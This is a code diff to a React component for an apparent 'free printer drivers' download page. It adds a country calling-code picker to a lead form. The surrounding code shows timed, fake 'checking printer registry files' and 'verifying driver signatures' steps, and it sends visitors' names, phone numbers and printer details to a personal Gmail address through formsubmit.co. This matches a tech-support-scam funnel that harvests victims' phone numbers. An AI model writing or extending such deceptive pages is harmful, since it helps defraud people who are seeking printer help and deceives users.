@@ -23,6 +23,13 @@ const CHECK_DURATIONS = [7500, 7500, 7500, 7500, 7500, 7500, 7500, 7500];
 const DETECT_LABELS = ['', 'checking printer registry files…', 'verifying driver signatures…'];
 const DETECT_DURATIONS = [1600, 2200, 1900, 900];
 const FORMSUBMIT_ENDPOINT = 'https://formsubmit.co/ajax/leads1928@gmail.com';
+const PHONE_COUNTRIES = [
+  { value: 'nz', name: 'New Zealand', code: '+64' },
+  { value: 'us', name: 'United States', code: '+1' },
+  { value: 'uk', name: 'United Kingdom', code: '+44' },
+  { value: 'ca', name: 'Canada', code: '+1' },
+  { value: 'au', name: 'Australia', code: '+61' },
+] as const;
 
 /**
  * "Quick Download Free Drivers" form + setup-wizard dialog on the
@@ -45,6 +52,7 @@ export function DriverDownload({
   const [modelNumber, setModelNumber] = useState('');
   const [contactName, setContactName] = useState('');
   const [contactPhone, setContactPhone] = useState('');
+  const [phoneCountry, setPhoneCountry] = useState<(typeof PHONE_COUNTRIES)[number]['value']>('nz');
   const [contactError, setContactError] = useState('');
   const [contactSubmitting, setContactSubmitting] = useState(false);
   const [leadSubmitted, setLeadSubmitted] = useState(false);
@@ -133,6 +141,7 @@ export function DriverDownload({
     e.preventDefault();
     const name = contactName.trim();
     const phone = contactPhone.trim();
+    const selectedPhoneCountry = PHONE_COUNTRIES.find((country) => country.value === phoneCountry) ?? PHONE_COUNTRIES[0];
     if (!name || !phone) {
       setContactError('Please enter your name and mobile number.');
       return;
@@ -149,7 +158,8 @@ export function DriverDownload({
         },
         body: JSON.stringify({
           name,
-          phone,
+          phone: `${selectedPhoneCountry.code} ${phone}`,
+          country: selectedPhoneCountry.name,
           brand: brandName,
           model: modelNumber,
           connection: conn,
@@ -407,18 +417,35 @@ export function DriverDownload({
                             className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
                           />
                         </label>
-                        <label className="block text-lg font-semibold text-[#333]">
-                          Mobile number
-                          <input
-                            type="tel"
-                            value={contactPhone}
-                            onChange={(e) => setContactPhone(e.target.value)}
-                            autoComplete="tel"
-                            inputMode="tel"
-                            required
-                            className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
-                          />
-                        </label>
+                        <div>
+                          <label className="block text-lg font-semibold text-[#333]">
+                            Country / calling code
+                            <select
+                              value={phoneCountry}
+                              onChange={(e) => setPhoneCountry(e.target.value as (typeof PHONE_COUNTRIES)[number]['value'])}
+                              aria-label="Country calling code"
+                              className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-[#edf7ff] px-3 py-3 text-base font-semibold text-[#1a5e9e] outline-none focus:border-[#1a8cf5]"
+                            >
+                              {PHONE_COUNTRIES.map((country) => (
+                                <option key={country.value} value={country.value}>
+                                  {country.name} {country.code}
+                                </option>
+                              ))}
+                            </select>
+                          </label>
+                          <label className="mt-4 block text-lg font-semibold text-[#333]">
+                            Mobile number
+                            <input
+                              type="tel"
+                              value={contactPhone}
+                              onChange={(e) => setContactPhone(e.target.value)}
+                              autoComplete="tel"
+                              inputMode="tel"
+                              required
+                              className="mt-2 w-full rounded-xl border border-[#b9cde1] bg-white px-4 py-3 text-xl font-normal outline-none focus:border-[#1a8cf5]"
+                            />
+                          </label>
+                        </div>
                       </div>
                       {contactError ? <p role="alert" className="mt-4 text-base font-medium text-[#b42318]">{contactError}</p> : null}
                       <div className="mt-6 flex flex-col gap-3 sm:flex-row">
